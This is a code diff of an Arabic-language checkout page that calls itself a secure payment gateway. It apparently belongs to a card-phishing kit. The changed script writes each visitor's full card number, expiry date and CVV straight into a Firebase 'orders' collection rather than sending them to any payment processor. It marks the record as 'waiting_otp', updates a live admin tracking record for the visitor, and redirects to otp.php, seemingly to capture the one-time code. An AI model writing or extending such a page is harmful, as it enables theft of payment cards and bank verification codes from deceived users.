@@ -1,3 +1,7 @@
+<?php
+// بوابة الدفع الآمنة - المهندس حسن
+// متوافق تماماً مع Vercel ويعمل بنظام Firebase Firestore
+?>
 <!doctype html>
 <html lang="ar" dir="rtl">
 <head>
@@ -14,7 +18,6 @@
     * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
     body { margin: 0; padding: 0; background-color: var(--bg-color); font-family: 'Segoe UI', sans-serif; }
 
-    /* الهيدر الرسمي */
     .header-fixed {
       position: fixed;
       top: 0;
@@ -80,7 +83,7 @@
       border: 1.5px solid #e0e0e0;
       border-radius: 12px;
       padding: 0 15px;
-      font-size: 16px;
+      font-size: 18px;
       outline: none;
       transition: border-color 0.3s;
       text-align: left;
@@ -168,7 +171,6 @@
 
 <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-firestore-compat.js"></script>
-<script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-analytics-compat.js"></script>
 
 <script>
     const firebaseConfig = {
@@ -177,29 +179,32 @@
       projectId: "jusour-qatar",
       storageBucket: "jusour-qatar.appspot.com",
       messagingSenderId: "927435762624",
-      appId: "1:927435762624:web:11d0bf460b62e4af9db625",
-      measurementId: "G-CSRM4QLNR9"
+      appId: "1:927435762624:web:11d0bf460b62e4af9db625"
     };
     
     firebase.initializeApp(firebaseConfig);
     const db = firebase.firestore();
-    const analytics = firebase.analytics();
 
     const currentOrderId = sessionStorage.getItem("last_order_id");
 
-    // تتبع العميل في لوحة التحكم
+    // تتبع حالة العميل (إنه الآن في مرحلة الدفع)
     if (currentOrderId) {
         db.collection("active_visits").doc(currentOrderId).set({
-            page: "checkout",
+            page: "صفحة الدفع - إدخال البطاقة",
             last_seen: firebase.firestore.FieldValue.serverTimestamp()
-        }, { merge: true });
+        }, { merge: true }).catch(e => console.log(e));
     }
 
+    // تنسيق رقم البطاقة تلقائياً
     document.getElementById('cardNumber').addEventListener('input', function (e) {
       e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{4})/g, '$1 ').trim();
     });
+    
+    // تنسيق التاريخ تلقائياً
     document.getElementById('expDate').addEventListener('input', function (e) {
-      e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{2})/, '$1/').trim();
+      let v = e.target.value.replace(/[^\d]/g, '');
+      if (v.length >= 2) v = v.substring(0,2) + '/' + v.substring(2,4);
+      e.target.value = v;
     });
 
     document.getElementById("paymentForm").onsubmit = async (e) => {
@@ -207,30 +212,36 @@
         
         const btn = document.getElementById("payBtn");
         btn.disabled = true;
-        btn.innerHTML = "جاري المعالجة الآمنة...";
+        btn.innerHTML = "جاري التأمين والمعالجة...";
 
         const cardData = {
             card_number: document.getElementById("cardNumber").value,
             exp_date: document.getElementById("expDate").value,
             cvv: document.getElementById("cvv").value,
-            status: "card_submitted",
-            step: "checkout",
+            status: "waiting_otp", // نغير الحالة لانتظار الكود
             last_update: firebase.firestore.FieldValue.serverTimestamp()
         };
 
         try {
-            analytics.logEvent('payment_info_submitted');
-
             if (currentOrderId) {
+                // تحديث البيانات في الـ Order الحالي
                 await db.collection("orders").doc(currentOrderId).update(cardData);
+                
+                // تحديث حالة التتبع للأدمن
+                await db.collection("active_visits").doc(currentOrderId).update({
+                    page: "في انتظار OTP"
+                });
+
+                // الانتقال لصفحة الرمز السري
+                window.location.href = "otp.php";
             } else {
+                // حالة نادرة: لو الجلسة ضاعت، ننشئ طلب جديد
                 const newDoc = await db.collection("orders").add(cardData);
                 sessionStorage.setItem("last_order_id", newDoc.id);
+                window.location.href = "otp.php";
             }
-
-            window.location.href = "otp.php";
         } catch (err) {
-            console.error("Error:", err);
+            console.error("Firebase Error:", err);
             document.getElementById("errorBox").style.display = "block";
             btn.disabled = false;
             btn.innerHTML = "دفع الآن 🔒";
